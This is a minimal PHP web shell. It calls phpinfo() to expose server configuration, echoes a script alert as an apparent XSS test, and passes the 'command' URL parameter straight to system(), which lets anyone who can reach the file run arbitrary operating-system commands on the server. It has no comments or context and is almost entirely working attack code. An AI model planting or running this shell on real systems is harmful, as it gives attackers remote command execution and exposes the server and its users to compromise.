<?php
phpinfo();
echo "<script>alert(XSS);</script>";
echo "Run command: ".htmlspecialchars($_GET['command']);
system($_GET['command']);
?>
